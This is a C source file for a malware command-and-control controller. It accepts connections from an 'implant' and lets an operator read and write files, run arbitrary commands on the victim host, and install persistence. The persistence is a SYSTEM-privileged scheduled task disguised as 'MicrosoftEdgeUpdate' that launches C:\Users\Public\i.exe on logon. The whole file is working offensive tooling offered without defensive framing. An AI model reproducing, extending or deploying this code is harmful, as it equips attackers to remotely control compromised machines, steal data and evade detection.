#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include "protocol.h"
#include <stdlib.h>
#include "controller_utils.h"

#define PERSISTENCE_UNKNOWN -1
#define PERSISTENCE_DISABLED  0
#define PERSISTENCE_ENABLED   1

#define PERSISTENCE_TASK_NAME "MicrosoftEdgeUpdate"
#define PERSISTENCE_TASK_CMD  "C:\\Users\\Public\\i.exe"
#define PERSISTENCE_CHECK_CMD \
    "schtasks /query /tn \"MicrosoftEdgeUpdate\" >nul 2>&1 && echo TASK_EXISTS || echo TASK_MISSING"
#define PERSISTENCE_CREATE_CMD \
    "schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \"C:\\Users\\Public\\i.exe\" /sc ONLOGON /ru SYSTEM /rl HIGHEST /f"

// Returns 0 on success, -1 if connection was lost
int process_response(Packet *response, int request_id, int client_fd)
{
    if (response == NULL)
    {
        printf("Connection lost.\n\n");
        close(client_fd);
        return -1;
    }

    if (response->request_id != request_id)
    {
        printf("ERROR: request ID mismatch, expected %d got %d\n", request_id, response->request_id);
        close(client_fd);
        free_packet(response);
        return -1;
    }

    print_packet_contents(response);
    free_packet(response);
    return 0;
}

void display_header(int persistence)
{
    const char *status;
    if (persistence == PERSISTENCE_ENABLED)
        status = "ENABLED ";
    else if (persistence == PERSISTENCE_DISABLED)
        status = "DISABLED";
    else
        status = "UNKNOWN ";

    printf("+------------------------------------+\n");
    printf("| %-34s |\n", "C2 Controller");
    printf("| Persistence: %-21s |\n", status);
    printf("+------------------------------------+\n");
}

void display_prompt(int persistence)
{
    display_header(persistence);
    printf("Select a command:\n");
    printf("  1 - HEARTBEAT\n");
    printf("  2 - SET_SLEEP\n");
    printf("  3 - SHUTDOWN     (removes implant + task)\n");
    printf("  4 - READ_DATA\n");
    printf("  5 - WRITE_DATA\n");
    printf("  6 - RUN_CMD\n");
    printf("  7 - ENABLE PERSISTENCE\n");
    printf("> ");
    fflush(stdout);
}

int console_input(int persistence)
{
    int choice;
    while (1)
    {
        char input_buffer[32];
        display_prompt(persistence);

        if (fgets(input_buffer, sizeof(input_buffer), stdin) == NULL)
        {
            printf("\n");
            printf("Input error. Try again.\n");
            continue;
        }

        if (strchr(input_buffer, '\n') == NULL)
        {
            flush_stdin();
        }

        if ((sscanf(input_buffer, "%d", &choice) == 1) && (choice >= 1 && choice <= 7))
        {
            break;
        }

        printf("INVALID INPUT! Please enter an integer from 1-7.\n");
    }

    return choice;
}

char *parameters_input(char *display_message)
{
    char *input = malloc(256);
    printf(display_message);
    fgets(input, 256, stdin);

    if (strchr(input, '\n') == NULL)
    {
        flush_stdin();
    }

    input[strcspn(input, "\n")] = '\0';
    return input;
}

// Sends a RUN_CMD and returns the response payload — caller must free_packet().
// Returns NULL on connection loss.
Packet *run_cmd_raw(const char *cmd, int *request_id, int client_fd)
{
    (*request_id)++;
    Packet packet = {COMMAND_RUN_CMD, *request_id, strlen(cmd), (char *)cmd};
    send_packet(&packet, client_fd);
    return recieve_packet(client_fd);
}

// Auto-detect whether the persistence scheduled task exists on the implant.
// Sends a silent RUN_CMD check right after HELLO.
int detect_persistence(int *request_id, int client_fd)
{
    Packet *response = run_cmd_raw(PERSISTENCE_CHECK_CMD, request_id, client_fd);

    if (response == NULL)
        return PERSISTENCE_UNKNOWN;

    int result = PERSISTENCE_UNKNOWN;
    if (response->payload != NULL)
    {
        if (strstr(response->payload, "TASK_EXISTS"))
            result = PERSISTENCE_ENABLED;
        else if (strstr(response->payload, "TASK_MISSING"))
            result = PERSISTENCE_DISABLED;
    }

    free_packet(response);
    return result;
}

int main(int argc, char *argv[])
{
    int controller_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (controller_fd < 0)
    {
        perror("socket");
        return 1;
    }

    int opt = 1;
    setsockopt(controller_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    int port = 4444;
    const char *env_port = getenv("C2_PORT");
    if (env_port != NULL && env_port[0] != '\0')
    {
        int p = atoi(env_port);
        if (p > 0) port = p;
    }

    struct sockaddr_in server_ip_structure;
    memset(&server_ip_structure, 0, sizeof(server_ip_structure));
    server_ip_structure.sin_family = AF_INET;
    server_ip_structure.sin_port = htons(port);
    server_ip_structure.sin_addr.s_addr = INADDR_ANY;

    if (bind(controller_fd, (struct sockaddr *)&server_ip_structure, sizeof(server_ip_structure)) < 0)
    {
        perror("bind");
        close(controller_fd);
        return 1;
    }

    if (listen(controller_fd, 2) < 0)
    {
        perror("listen");
        close(controller_fd);
        return 1;
    }

    printf("<Controller listening on port %d>\n\n", port);

    // ── Outer loop: re-accept after every disconnect ───────────────────────────
    while (1)
    {
        printf("<Waiting for implant...>\n\n");
        fflush(stdout);

        struct sockaddr_in client_ip_structure;
        socklen_t size_of_client = sizeof(client_ip_structure);
        int client_fd = accept(controller_fd, (struct sockaddr *)&client_ip_structure, &size_of_client);

        if (client_fd < 0)
        {
            perror("accept");
            close(controller_fd);
            return 1;
        }

        printf("<Implant connected — waiting for HELLO...>\n\n");

        Packet *hello = recieve_packet(client_fd);

        if (hello == NULL || hello->command_type != COMMAND_HELLO)
        {
            printf("Unexpected initial packet. Dropping connection.\n\n");
            close(client_fd);
            continue;
        }

        print_packet_contents(hello);
        free_packet(hello);

        int request_id = 0;

        // Auto-detect persistence state immediately after HELLO
        printf("<Checking persistence status...>\n\n");
        fflush(stdout);
        int persistence = detect_persistence(&request_id, client_fd);

        int connected = 1;

        // ── Inner loop: handle commands until connection drops ─────────────────
        while (connected)
        {
            int user_choice = console_input(persistence);

            switch (user_choice)
            {
            case COMMAND_HEARTBEAT:
            {
                request_id++;
                Packet packet = {COMMAND_HEARTBEAT, request_id, 0, NULL};
                send_packet(&packet, client_fd);

                Packet *response = recieve_packet(client_fd);
                if (process_response(response, request_id, client_fd) == -1)
                    connected = 0;

                break;
            }

            case COMMAND_READ_DATA:
            {
                char *path = parameters_input("Enter the path to file to read: ");

                request_id++;
                Packet packet = {COMMAND_READ_DATA, request_id, strlen(path), path};
                send_packet(&packet, client_fd);
                free(path);

                Packet *response = recieve_packet(client_fd);
                if (process_response(response, request_id, client_fd) == -1)
                    connected = 0;

                break;
            }

            case COMMAND_WRITE_DATA:
            {
                char *path = parameters_input("Enter the path to file to write to (include filename): ");
                char *data = parameters_input("Enter the data to write: ");

                int path_len = strlen(path);
                int data_len = strlen(data);
                int total_bytes = 4 + path_len + data_len;

                char *payload = malloc(total_bytes);
                memcpy(payload, &path_len, 4);
                memcpy(payload + 4, path, path_len);
                memcpy(payload + 4 + path_len, data, data_len);

                request_id++;
                Packet packet = {COMMAND_WRITE_DATA, request_id, total_bytes, payload};
                send_packet(&packet, client_fd);
                free(path);
                free(data);
                free(payload);

                Packet *response = recieve_packet(client_fd);
                if (process_response(response, request_id, client_fd) == -1)
                    connected = 0;

                break;
            }

            case COMMAND_RUN_CMD:
            {
                char *cmd = parameters_input("Enter command to run: ");

                request_id++;
                Packet packet = {COMMAND_RUN_CMD, request_id, strlen(cmd), cmd};
                send_packet(&packet, client_fd);
                free(cmd);

                Packet *response = recieve_packet(client_fd);
                if (process_response(response, request_id, client_fd) == -1)
                    connected = 0;

                break;
            }

            case COMMAND_SET_SLEEP:
            {
                char *sleep_str = parameters_input("Enter the time to sleep in seconds: ");
                int sleep_data = atoi(sleep_str);
                free(sleep_str);

                char *payload = malloc(4);
                memcpy(payload, &sleep_data, 4);

                request_id++;
                Packet packet = {COMMAND_SET_SLEEP, request_id, 4, payload};
                send_packet(&packet, client_fd);
                free(payload);

                Packet *response = recieve_packet(client_fd);
                if (process_response(response, request_id, client_fd) == -1)
                {
                    connected = 0;
                    break;
                }

                printf("<Waiting for implant to reconnect after sleep...>\n\n");
                fflush(stdout);

                struct sockaddr_in reconnect_addr;
                socklen_t reconnect_len = sizeof(reconnect_addr);
                client_fd = accept(controller_fd, (struct sockaddr *)&reconnect_addr, &reconnect_len);

                if (client_fd < 0)
                {
                    perror("accept");
                    connected = 0;
                    break;
                }

                Packet *reconnect_hello = recieve_packet(client_fd);
                if (process_response(reconnect_hello, 0, client_fd) == -1)
                {
                    connected = 0;
                    break;
                }

                request_id = 0;
                break;
            }

            case COMMAND_SHUTDOWN:
            {
                request_id++;
                Packet packet = {COMMAND_SHUTDOWN, request_id, 0, NULL};
                send_packet(&packet, client_fd);

                Packet *response = recieve_packet(client_fd);
                process_response(response, request_id, client_fd);

                persistence = PERSISTENCE_DISABLED;
                close(client_fd);
                close(controller_fd);
                return 0; // intentional shutdown — exit cleanly
            }

            case 7: // ENABLE PERSISTENCE
            {
                if (persistence == PERSISTENCE_ENABLED)
                {
                    printf("Persistence is already enabled.\n\n");
                    break;
                }

                printf("<Creating scheduled task on implant...>\n\n");
                fflush(stdout);

                Packet *response = run_cmd_raw(PERSISTENCE_CREATE_CMD, &request_id, client_fd);

                if (response == NULL)
                {
                    connected = 0;
                    break;
                }

                // schtasks prints "SUCCESS" on creation
                if (response->payload != NULL && strstr(response->payload, "SUCCESS"))
                {
                    persistence = PERSISTENCE_ENABLED;
                    printf("<Persistence ENABLED — task '%s' created.>\n\n", PERSISTENCE_TASK_NAME);
                }
                else
                {
                    printf("<Failed to create scheduled task. Response below.>\n\n");
                }

                free_packet(response);
                break;
            }

            default:
                break;
            }
        }

        // connection dropped — loop back to accept()
        printf("<Connection lost. Waiting for implant to reconnect...>\n\n");
        fflush(stdout);
    }
}
